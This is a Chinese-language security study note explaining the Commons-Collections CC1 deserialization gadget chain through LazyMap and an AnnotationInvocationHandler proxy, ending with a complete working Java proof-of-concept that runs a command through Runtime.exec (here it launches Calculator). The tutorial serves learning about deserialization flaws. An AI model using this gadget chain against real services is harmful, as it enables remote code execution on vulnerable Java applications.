# 反序列化基础篇-CC1-LazyMap

## 0x00 前置知识
### writeObject和readObject
Java在序列化一个对象时，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个 `stream` 中；

反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

### 如何寻找Gadget?
一条完整的Gadget，应当具备以下成分：
- 入口类
- 链中类
- 危险方法（`Runtime.getRuntime().exec()`)
  - 不同类的同名函数
  - 任意方法调用（反射/动态加载字节码）

入口类条件：
- 可序列化
- 能重写readObject
- 接收任意对象作为参数（集合类型/接收Object）

链中类条件：
- 可序列化
- 接收任意对象作为参数（集合类型/接收Object）

## 0x01 环境搭建
1、maven项目导入依赖

pom.xml导入依赖
```
<!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
<dependency>
    <groupId>commons-collections</groupId>
    	<artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

2、JDK版本及sun包源码

`CC1` 链对 JDK 版本有要求，需在 `8u71` 之前。
`CC1` 链需要用到 `sun` 包中的类，而 `sun` 包在 `jdk` 中的代码是通过 `class` 文件反编译来的，不是 `java` 文件，调试不方便，通过 `find usages` 是搜不到要找的类的，而且其代码中的对象是 `var` 这样的形式，影响代码的阅读。

下载`sun`包，把 `src/share/classes`中的 `sun` 文件夹 放到 `oracle jdk8u66`的`src`文件夹下。
https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4

<div align=center><img width="641" alt="image" src="https://user-images.githubusercontent.com/84888757/204700877-5c68fc27-ba97-4dab-a0cd-01a70d91bdeb.png" /></div>

将`sun`包复制到对应`jdk`的`src`目录下（Macbook时在/Library/Java/JavaVirtualMachines/jdk1.8.0_66.jdk/Contents/Home/Src下）

<img width="1155" alt="image" src="https://user-images.githubusercontent.com/84888757/204702741-0e8acfc6-52ec-4f28-965b-08e3178d7426.png">

然后在 IDEA 中，`File-->Project Structure- ->SDKs` 将 `src` 目录的路径加到 `Sourcepath` 中去：  

<div align=center><img width="894" alt="image" src="https://user-images.githubusercontent.com/84888757/204702840-522354dc-6fc8-4e28-b106-56b240d0908f.png" /></div>

下载maven源码包：

<div align=center><img width="445" alt="image" src="https://user-images.githubusercontent.com/84888757/204703339-9e7d9b3c-e354-489d-8ff2-e5992f3ddc8f.png" /></div>


## 0x02 CC1 TransformedMap Gadget 分析回顾
在[CC1-TransformedMap](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-TransformedMap.md)这一篇文章中，我们已经找到了危险函数`InvokerTransformer#transform`

![image](https://user-images.githubusercontent.com/84888757/204717213-1fd876e6-f047-4a73-972b-8451590fcc5a.png)

我们已经找到了危险方法，那么现在应该向前找，谁调用了这个危险方法。

右键`Find Usages`，找到`LazyMap`和`TransformedMap`都调用了该危险方法。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205279462-7bee0c72-3f25-4f4c-8b98-e339d296a1bf.png" /></div>

之前已经分析完了`TransformedMap`的，这次来分析一下`LazyMap`吧。

<div align=center><img width="1040" alt="image" src="https://user-images.githubusercontent.com/84888757/205279498-7ad7b0a2-50a8-454e-974b-50d628fcf7a2.png" /></div>


先放一下调用链：
```
/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
```


## 0x03 LazyMap是什么？
`LazyMap` 和 `TransformedMap` 类似，都来自于`Common-Collections`库，并继承了 `AbstractMapDecorator`。

`LazyMap`的漏洞触发点和`TransformedMap`并不相同。
- `TransformedMap` 是在写入元素的时候执行 `transform`
- `LazyMap` 是在其`get`方法中执行的 `factory.transform`

看到`factory`是`FactoryTransformer`的一个实例：

<img width="977" alt="image" src="https://user-images.githubusercontent.com/84888757/205284900-6ba5d657-5924-4c29-a820-637790b998fa.png">

<div align=center><img width="703" alt="image" src="https://user-images.githubusercontent.com/84888757/205285022-7f1b32da-79fc-49ed-9900-ec030e2010be.png" /></div>


可以看到，`LazyMap#get` 就是在当前`map`里找不到对应的`key`时，调用 `factory.transform` 方法去获取一个`value`，并将这对`k-v`放入`map`中；

但是如果当前`map`中存在要找的`key`，就直接返回`key`。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/205279498-7ad7b0a2-50a8-454e-974b-50d628fcf7a2.png" /></div>

如何实例化一个`LazyMap`对象？

因为`LazyMap`类的构造函数都是`protected`的，实际是由`LazyMap`类的`decorate`函数返回一个`LazyMap`对象。

<div align=center><img width="703" alt="image" src="https://user-images.githubusercontent.com/84888757/205285309-910648fa-471e-4a3b-bdc3-721570195bbc.png" /></div>

`LazyMap#get`方法中的`factory`就是我们传入的`transformerChain`，也就是说，只要调用了`get`方法，并且`Map`对象中的没有要找的`key`，就可以触发`ChainedTransformer`的`transform`方法，从而实现`transformers`数组进行一系列的回调，进而执行命令。


但是在 `sun.reflect.annotation.AnnotationInvocationHandler` 的`readObject`方法中并没有直接调用到`Map`的`get`方法，所以`LazyMap`的后续利用会比`TransformedMap`更复杂。

因此，`ysoserial`找到`AnnotationInvocationHandler#invoke`方法有调用到`get`：

![image](https://user-images.githubusercontent.com/84888757/205286283-b948312e-e3e4-4e3b-9358-755515840a1d.png)

那接下来，如何能调用到 `AnnotationInvocationHandler#invoke` 呢？

答：利用 Java 的对象代理。

## 0x04 Java对象代理
详细一点的基础知识看这里：
[Java基础-代理Proxy](https://www.cnblogs.com/xdp-gacl/p/3971367.html)

作为一门静态语言，如果想劫持一个对象内部的方法调用，需要用到`java.lang.reflect.Proxy`，用到`newProxyInstance`进行代理对象的实例化。

我刚开始学习时，总结了实现动态代理的一般步骤如下：

1. 定义对象的行为接口。
2. 定义要被代理的 **目标对象类**，该类需要实现上一步的接口。
3. 写一个 `InvocationHandler` 实现类 `DemoInvocationHandler` ，该实现类的 `invoke()` 方法将会作为代理对象的方法实现。
4. 创建**代理类**，然后在**代理类** `DemoProxy` 中写个 `getProxy` 方法，，该方法为 **目标对象** 生成一个 **动态代理对象** ，其中的 `Proxy.newProxyInstance` 方法需要调用 `DemoInvocationHandler` 。
5. 最后进行测试，在 `ProxyTest` 中调用 `getProxy` 方法创建 `DemoProxy` 实例，专为指定的 **目标对象** 生成 **动态代理对象** 。

具体的过程我们下面来一步一步说明（并没有完全循规蹈矩地按上述步骤分类进行 🤧 ）。

在java中规定，要想产生一个对象的代理对象，那么这个对象必须要有一个接口，所以我们第一步应该是设计这个对象的接口，在接口中定义这个对象所具有的行为(方法)

### 4.1 定义对象的行为接口

这里对象的行为接口，我们使用`Map`接口，在其实现类`HashMap`中会实现`Map#get`方法

<div align=center><img width="352" alt="image" src="https://user-images.githubusercontent.com/84888757/205323474-536e56db-af64-473f-8fb7-e2c098c4efd1.png" /></div>

<div align=center><img width="474" alt="image" src="https://user-images.githubusercontent.com/84888757/205323525-b65db1dd-120b-4183-a094-973a7a3c6966.png" /></div>

### 4.2 定义要被代理的目标对象类
这里要被代理的 **目标对象类** 我们使用 `HashMap` 类， `HashMap` 类实现了 `Map` 接口：

<div align=center><img width="674" alt="image" src="https://user-images.githubusercontent.com/84888757/205332851-139bb100-d850-47d6-b535-9e46905b9475.png" /></div>

`HashMap` 作为 `Map` 接口的实现类，需要实现 `get` 方法，该方法的作用是若 `key` 存在，就返回对应的 `value`，否则返回 `null` ：

<div align=center><img width="742" alt="image" src="https://user-images.githubusercontent.com/84888757/205338806-9d6b144f-0875-4c1c-b206-9f9d19768e3c.png" /></div>


### 4.3 创建代理类
（实际上这里是写了一个 `InvocationHandler` 实现类）

现在我们要写一个**代理类** `DemoProxyInvocationHandler` ，**代理类** `DemoProxyInvocationHandler` 需要实现 `InvocationHandler` 接口，因为之后在创建**代理类对象**的时候需要使用 `java.lang.reflect.Proxy#newProxyInstance`，而 `java.lang.reflect.Proxy#newProxyInstance` 的第3个参数需要一个实现了`InvocationHandler`接口的对象。

- `Proxy.newProxyInstance` 的第一个参数是`ClassLoader`，我们用默认的即可；
- 第二个参数是我们需要代理的对象集合；
- 第三个参数是一个实现了`InvocationHandler`接口的对象，里面包含了具体代理的逻辑。

<div align=center><img width="674" alt="image" src="https://user-images.githubusercontent.com/84888757/205290651-2b4dd1f6-5062-4bf8-abaf-9e14d544859e.png" /></div>

`InvocationHandler` 接口只有一个`invoke`方法，`InvocationHandler`接口的实现类必须实现`invoke`方法。

<div align=center><img width="674" alt="image" src="https://user-images.githubusercontent.com/84888757/205317856-e080cac4-35f9-49c6-9fda-84175dadd1e1.png" /></div>


所以，我们写的**代理类** `DemoProxyInvocationHandler` 类需要实现 `InvocationHandler` 接口、需要实现 `invoke` 方法，并且代理的是一个 `HashMap` 对象。
```
package org.vulhub.proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.HashMap;

class DemoProxyInvocationHandler implements InvocationHandler {
    //设计一个类变量记住代理类要代理的目标对象HashMap
//    protected Map hashmap = new HashMap();
    protected HashMap hashmap = new HashMap();

    public DemoProxyInvocationHandler(HashMap hashmap) {
        this.hashmap = hashmap;
    }

    // 实现invoke方法
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        // 如果调用的方法名是 get，返回一个字符串`Hacker ZhangSan`。
        if (method.getName().equals("get")) {
            System.out.println("Hook method: " + method.getName());
            return "Hacker ZhangSan";
        }

        // 如果调用的方法名不是 get，代理对象就调用真实目标对象HashMap的对应方法去处理用户请求
        return method.invoke(this.hashmap, args);

    }
}
```

`DemoProxyInvocationHandler`类已经实现了`invoke`方法，该`invoke`方法的作用是在监控到调用的方法名是`get`的时候，返回一个字符串`Hacker ZhangSan`。

### 4.4 创建代理类对象，并进行测试
创建一个测试类 `DemoProxyTest` ，通过代理类对象 `proxyMap` 调用 `get` 方法：
```
package org.vulhub.proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class DemoProxyTest {
    public static void main( String[] args )
    {
        // 创建一个 InvocationHandler 对象 handler，为创建代理类对象的 newProxyInstance 方法提供第3个参数
        InvocationHandler handler = new DemoProxyInvocationHandler(new HashMap());
        // 创建代理类对象
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class}, handler);

        proxyMap.put("hello", "world");
        // get是Map.java自带的方法
        String result = (String) proxyMap.get("hello");
        System.out.println(result);
    }
}

```

运行测试类 `DemoProxyTest` ，发现虽然向 `Map` 放入的 `hello` 对应的 `value` 为 `world` ，但我们获取到的结果却是 `Hacker ZhangSan`。

因为 `Proxy` 类负责创建 **代理类对象** 时，如果指定了 `handler`（**处理器**），那么不管用户调用 **代理类对象** 的什么方法，该方法都是先调用 **处理器** 的 `invoke` 方法。（在本次例子中就是所谓 **代理类** 的 `invoke` 方法）

<img width="998" alt="image" src="https://user-images.githubusercontent.com/84888757/205350738-65df367d-5cfc-4063-bb8a-a554d6899b1e.png">


我们回看 `sun.reflect.annotation.AnnotationInvocationHandler` ，会发现实际上这个类实际就是一个 `InvocationHandler` 的实现类，我们如果将 `sun.reflect.annotation.AnnotationInvocationHandler` 类用 `Proxy`类创建一个代理类对象，那么在 `readObject` 的时候，只要调用任意方法，就会进入到 `AnnotationInvocationHandler#invoke` 方法中，进而触发我们的 `LazyMap#get` 。


## 0x05 使用LazyMap构造利用链

在之前的[TransformedMap POC](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-TransformedMap.md#0x03-poc-%E7%BC%96%E5%86%99)的基础上做个修改，先用 `LazyMap` 替换 `TransformedMap`：

```
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

然后，创建一个 `sun.reflect.annotation.AnnotationInvocationHandler` 实际对象的Proxy对象：

（别忘了通过反射调用，忘记为啥的看[这里](https://github.com/reidmu/sec-note/blob/main/Java-sec/CC1-TransformedMap.md#34-annotationinvocationhandler-%E7%9A%84%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8))

```
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);

// 创建InvocationHandler接口的实现类的实例
InvocationHandler handler = (InvocationHandler) construct.newInstance(SuppressWarnings.class, outerMap);

// 创建代理类对象
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
```

代理后的对象叫做 `proxyMap` ，但不能直接对其进行序列化，因为反序列化的入口点是 `sun.reflect.annotation.AnnotationInvocationHandler#readObject` ，所以还需要再用 `AnnotationInvocationHandler` 对这个 `proxyMap` 进行包裹：

```
handler = (InvocationHandler) construct.newInstance(SuppressWarnings.class, proxyMap);
```

最终的POC如下：
```
package org.vulhub.Ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1_2 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建一个map，不用添加Entry
        Map innerMap = new HashMap();

        // 调用LazyMap.decorate实例化LazyMap
        Map transformedMap = LazyMap.decorate(innerMap, transformerChain);

        // 通过反射创建 AnnotationInvocationHandler 对象
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
//        Object obj = construct.newInstance(SuppressWarnings.class, transformedMap);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(SuppressWarnings.class, transformedMap);

        // 创建代理对象
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);

        // 用 `AnnotationInvocationHandler` 对这个 `proxyMap` 进行包裹
        handler = (InvocationHandler) construct.newInstance(SuppressWarnings.class, proxyMap);


//        // 序列化
//        ByteArrayOutputStream bos = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(bos);
//        oos.writeObject(handler);
//        oos.close();
//        // 输出序列化后的数据
//        System.out.println(bos);
//
//        // 反序列化
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
//        Object o = (Object)ois.readObject();

        // 序列化
        serialize(handler);
        // 反序列化
        unserialize("ser_CC1_2.bin");

    }

    public static void serialize(Object handler) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("./ser_CC1_2.bin");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
        outputStream.writeObject(handler);
        outputStream.close();
        fileOutputStream.close();
    }

    public static void unserialize(String args) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(args);
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}

```

<img width="1332" alt="image" src="https://user-images.githubusercontent.com/84888757/205368883-e93e2226-674c-442e-92b7-f57bca2fe90d.png">


## 0x06 参考链接
- [Java基础加强总结——代理(Proxy) ](https://www.cnblogs.com/xdp-gacl/p/3971367.html)
- [Java安全漫谈 - 11.LazyMap详解](https://t.zsxq.com/FufUf2B)
